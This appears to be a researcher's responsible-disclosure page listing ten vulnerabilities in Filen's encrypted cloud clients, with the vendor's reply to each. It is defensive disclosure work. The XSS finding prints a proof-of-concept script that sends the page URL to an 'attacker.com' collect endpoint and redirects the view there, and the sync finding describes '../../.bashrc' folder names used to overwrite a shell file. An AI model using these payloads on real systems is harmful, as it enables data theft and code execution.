# Filen Responsible Disclosure

This page lists all findings responsibly disclosed to Filen. Read the main [blog](..) first for a more accessible digest of my findings. My findings were disclosed on 2026-07-12, which was answered a day later on 2026-07-13, this site lists all my findings and Filen's response.

## F01-01: Missing public key authentication

When a file or folder is shared, the item key is encrypted to the recipient's RSA public key. The client fetches that key from the backend with no verification at [`cloud/index.ts:2544`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/cloud/index.ts#L2544-L2548) (`shareItemsToUser`). No fingerprint check, no trust on first use, no pinning. A malicious server can substitute its own public key and the client will encrypt the item key to it, leaking file contents.

This is not a one-time risk at share creation. Every operation inside a shared folder re-fetches the recipient list and their public keys via [`checkIfItemParentIsShared`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/cloud/index.ts#L2703-L2727) (called from `moveFile`, `moveDirectory`, `createDirectory`, and all upload paths). This means any file operation would give a malicious backend a windows to steal the file contents.

I suggest adding a trust on first use mechanism and only accepting keys of users that are within a user's contacts. There should also be an option to out-of-band verify public keys.

**Response by Filen:**

> Agreed, and we will address it. The full attack needs our infrastructure to be deeply compromised, or malware or a MITM on the client machine itself. That is still inside the threat model we sign up for, so we are not treating it as out of scope. We will add trust-on-first-use for recipient public keys, with out-of-band verification as a follow-up, and we like your point about restricting shares to known contacts. This will come in a future update. FYI: v4 will also include our move from RSA to Kyber and Dilithium.

## F01-02: Authentication downgrade

During login, the client fetches `authVersion` from the server at [`index.ts:637-640`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/index.ts#L637-L640) and uses it as-is with zero validation. There is no minimum version check and no migration logic that upgrades authVersion after login. If the server responds with `authVersion: 1`, the client computes the password hash via [`hashPassword`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/crypto/utils.ts#L304-L313): `SHA512(SHA384(SHA256(SHA1(password))))` concatenated with `SHA512(MD5(MD4(MD2(password))))` (onion hashing with MD5, MD4 and MD2 would make any cryptographer cry). A malicious server can downgrade any login to v1 and brute-force the resulting unsalted hash offline.

I suggest rejecting any authVersion below the current minimum on the client side and force-rotating passwords for accounts still on v1. In the backend, apply an additional Argon2id layer over the existing hash. Overall the current construction allows for replay attacks so in the long term I suggest switching to using a proper PAKE such as OPAQUE to authenticate your users.

**Response by Filen:**

> Confirmed. Same note on the precondition (deeply compromised infrastructure, or client-side malware or MITM), and the same conclusion: it is in scope and we will fix it. This is part of the v4 auth work already underway, which moves every account onto a KEK and DEK model and removes the legacy hashing paths, including rejecting any auth version below the current minimum on the client. Migrating existing accounts safely is what makes this a planning and execution job rather than a quick patch.

## F01-03: No file content integrity

Each chunk is encrypted with AES-256-GCM, which authenticates individual chunk ciphertext but not chunk ordering. Upload does compute a SHA-512 hash of the plaintext and embeds it in the encrypted metadata blob ([`streams.ts:351`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/cloud/streams.ts#L351)). This hash is never checked on download. A malicious server can reorder or drop chunks within a file. For formats tolerant of reordering (PDF, Markdown, some media containers), this can produce a valid, decryptable file with fundamentally different content.

The quickest fix is to recompute the SHA-512 hash of the decrypted plaintext after download and comparing it against the hash stored in the metadata. Long term I would suggest creating a proper MAC over a file which verifies the file's metadata as well.

**Response by Filen:**

> This is fixed in the new Rust SDK, which carries a per-file Blake3 content hash in metadata and uses it on the download path, something the old TypeScript SDK never did. It is already live in the new mobile app, and it reaches sync and the web and desktop clients as they move onto the new SDK.

## F01-04: No directory tree integrity

AES-GCM is used without the associated data field anywhere in the codebase. The universal encryption function [`Encrypt.metadata`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/crypto/encrypt.ts#L50-L159) takes only `{ metadata, key, version }` and does not include the location in the directlry tre as associated data (in fact I haven't seen you making use of AES-GCM's associated data anywhere). Since all folder metadata is encrypted with the same master key at [`encrypt.ts:59`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/crypto/encrypt.ts#L59), any folder's metadata ciphertext can be served in place of any other folder's. Files are not bound to theri UUID, so they can also be moved and swapped around. A malicous backend can re-order the directory tree and files as they wish.

I suggest binding each ciphertext to its UUID and type (i.e. file name, file size etc) by including them as AES-GCM associated data. This makes swapping ciphertext between UUIDs fail authentication.

**Response by Filen:**

> Confirmed, good writeup. To be clear with ourselves about the impact, this is an integrity issue rather than a confidentiality one. A malicious backend still cannot read anything, but with nothing binding a ciphertext to its identity it can rearrange, swap, roll back or relabel a user's own encrypted items. The reason this needs time is the same as F01-02: it changes the metadata format and means re-encrypting metadata for existing accounts, so it has to be migrated carefully rather than switched on. This is part of the v4 crypto work.

## F01-05: No auto-update signature check

The Windows desktop build sets `"verifyUpdateCodeSignature": false` at [`package.json:142`](https://github.com/FilenCloudDienste/filen-desktop/blob/74c71053a4197bedca972e12fea417e36382d209/package.json#L142). The installed binary is Authenticode-signed at build time but the updater does not verify the signature on downloaded updates. A malicous backend or a MITM attacker can serve an unsigned malicious executable and the updater will install it without any signature check. Because the update channel is per-user (generic HTTPS to `cdn.filen.io/@filen/desktop/release/latest/`), a malicious backend could single out a specific user, like the Notepad++ compromise earlier this year, where the Lotus Blossom APT [served a malicious build to only a small set of targets](https://cvereports.com/reports/CVE-2025-15556). I strongly suggest enabling code signatures.

**Response by Filen:**

> The signature verification was switched off while we move our signing over to Azure Trusted Signing, not left off by choice. It will be turned back on once that migration is done. Your point about how exposed the update channel is in the meantime is well taken, and we will keep this near the top of the list.

## F01-06: Filename confidentiality not guaranteed

To facilitate server-side seraching, the index uses [`nameSplitter`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/utils.ts#L320) to split names into substrings of length 2 through `min(name.length, 16)`. For "report.pdf" this produces "re", "ep", "po", "or", "rt", "t.", ".p", "pd", "df", "rep", "epo", ..., "report.pdf". Each is passed through a HMAC with a per-user key, so hashes differ across users. However due to the splitting and because these n-grams are so short, a malicous backend can do statistical analysis to recover the filenames. On mobile clients the server sends the query string as-typed to the backend via [`queryGlobalSearch`](https://github.com/FilenCloudDienste/filen-sdk-ts/blob/6f272ffac11802d5d1a64fb8796871b402db6a71/src/cloud/index.ts#L5766-L5772) (debounced at 1 second), giving the server additional data for statistical attacks.

Also, for v1/v2 users the backend sends a `nameHashed` which is a unsalted `SHA1(SHA512(name))` to the backend, so identical filenames produce identical hashes across all v1/v2 users and because there is no key, a malicous backend could brute-force the key. Also I really don't understand why anyone would wrap a SHA512 hash with a outer layer of SHA1?

I would refrain of sending any file hashes to the backend and perform all search queries on the user's device, even if this means they have to download a directory tree with all file / folder names to do so.

**Response by Filen:**

> Also addressed by the move to the new Rust SDK. It ships a client-side realtime cache and runs search locally against the drive, so we no longer depend on sending n-grams or name hashes to the backend to make search work. As clients move onto the new SDK, that server-side index goes away. We agree with the underlying principle that search should happen on the device.

**Update:** Filen confirmed the server no longer processes these search hashes. Some clients still send them, but they are ignored by the server and the feature is being removed altogether.

## F01-07: Stored XSS in mobile markdown preview

The mobile app renders markdown notes and `.md` without sanitization at [`dom.tsx:142-159`](https://github.com/FilenCloudDienste/filen-mobile/blob/01601160897bd3962c406fd36ed6ac79a7ed67be/components/notes/content/text/dom.tsx#L142-L159) and [`textEditor/dom/index.tsx:70-87`](https://github.com/FilenCloudDienste/filen-mobile/blob/01601160897bd3962c406fd36ed6ac79a7ed67be/components/textEditor/dom/index.tsx#L70-L87). I verified this with a PoC .md file on the latest update available on the Google Play Store:

```md

  
    new Image().src = 'https://attacker.com/collect?href=' + encodeURIComponent(location.href);
    alert('XSS');
    window.location.href = 'https://attacker.com';
  

```

Mitigating factors is that the user needs explicit interaction to toggle the previ button, but then any JavaScript could be run, making requests to attacker controlled URLs and even redirecting the WebView to any site, which could allow for phishing attacks.

I did notice after I finished my PoC that the new monorepo version at [`filen-ts/packages/filen-mobile`](https://github.com/FilenCloudDienste/filen-ts) added `rehype-sanitize` at the render site (`src/components/textEditor/dom.tsx:245`), but the app currently on the app store is still vunlnearble.

(FYI, for F01-07 there was meant to be a svg tag wrapping the JavaScript, which got stripped by the parser.)

**Response by Filen:**

> Thank you for the proof of concept. As you noticed, the new monorepo already sanitizes at the render site with rehype-sanitize. The gap is that the build currently on the stores predates that change, so getting the sanitized version out to users is something we will treat as a priority.

**Update:** Filen has fixed the mobile version shortly after my initial report.

## F01-08: Path traversal in sync engine

The sync engine constructs local paths from cloud folder names without validating that the resolved path stays within the sync root. At [`remote.ts:991`](https://github.com/FilenCloudDienste/filen-sync/blob/4bac146bf4c66a9d1a5cc8babfafff7cdb525674/src/lib/filesystems/remote.ts#L991), `relativePath` is joined with the sync root via `pathModule.posix.join`. The file is then downloaded to a temp location and moved to the final path via `fs.move` at line 1101. There is no sanitization anywhere in this path. The `isValidPath` helper in [`utils.ts:149-154`](https://github.com/FilenCloudDienste/filen-sync/blob/4bac146bf4c66a9d1a5cc8babfafff7cdb525674/src/utils.ts#L148-L154) has a commented-out `..` check that was deliberately disabled.

If the sync target is a shared folder, the attacker could share a folder with a victimg that contains names like `../../.bashrc`. While the clients don't allow to create directories `..` directly, by design of your e2e encryption this check can only be done client-side, so with a custom client I managed to PoC folders with `..` as name. When syncing this directory I managed to POC an overwrite of the user's `~/.bashrc`, which would achieve RCE on shell launch.

I suggest resolving and validating every path against the sync root before any filesystem write. There are 8 path-construction sites across `remote.ts` and `local.ts` that all need this check.

**Response by Filen:**

> The end-to-end scenario you describe relies on syncing a shared folder, and syncing shared folders is not something our clients support today, so that exact path is not reachable right now. That said, you are right that the path handling should not lean on that being true, and the disabled ".." check is a real gap. We will add proper resolve-and-validate against the sync root at every path construction site so it holds regardless.

## F01-09: CLI auth config written with world-readable permissions

The CLI at [`auth.rs:280`](https://github.com/FilenCloudDienste/filen-rs/blob/ee96e73/filen-cli/src/auth.rs#L280) writes a credentials file to `$HOME/.filen-cli/filen-cli-auth-config.txt` when no keychain is available. The write is done with mode `0o644` which means that its world-readable and any other user on the same system could read the file, gaining full access to the victim's Filen account and all encrypted data.

I suggest setting permissions to `0o600` explicitly, or disallowing file-based storage outside the keychain entirely.

**Response by Filen:**

> Straightforward, and we will fix it. The file should be 0o600, and we will tighten the fallback so credentials are never written world-readable when no keychain is available.

## F01-10: Mobile app stores master keys and private key in plaintext

The mobile app writes `auth.json` to the iOS app group container (`group.io.filen.app/auth.json`) or Android app documents directory so the File Provider extensions can read credentials across process boundaries. The schema is defined at [`fileProvider.ts:153-173`](https://github.com/FilenCloudDienste/filen-ts/blob/ae6bbb8e5f010e28abc9be3662cf12b185e5775f/packages/filen-mobile/src/features/settings/fileProvider.ts#L153-L173).

Password and 2FA code are hardcoded to `"redacted"` at the write site (lines 161-162), but `masterKeys`, `privateKey`, and `apiKey` are written verbatim in plaintext JSON. Anyone with filesystem access to the app group container can read these and decrypt all of the user's file metadata and shared item keys without the password or 2FA.

A separate `SecureStore` already exists (`secureStore/v1/securestore.bin`) which is properly AES-256-GCM encrypted with a device-bound key from the iOS Keychain or Android Keystore. I suggest encrypting `auth.json` the same way.

**Response by Filen:**

> We are looking into this now. The file is in that form because the File Provider on iOS and the Documents Provider on Android need to read credentials across a process boundary, and the open question is whether those extensions can reach the device keychain and keystore, or the existing encrypted SecureStore, the same way the main app can. If they can, we will encrypt auth.json exactly like SecureStore. We will confirm the approach once we have checked the extension constraints on both platforms.

**Update:** Filen confirmed this is fixed.
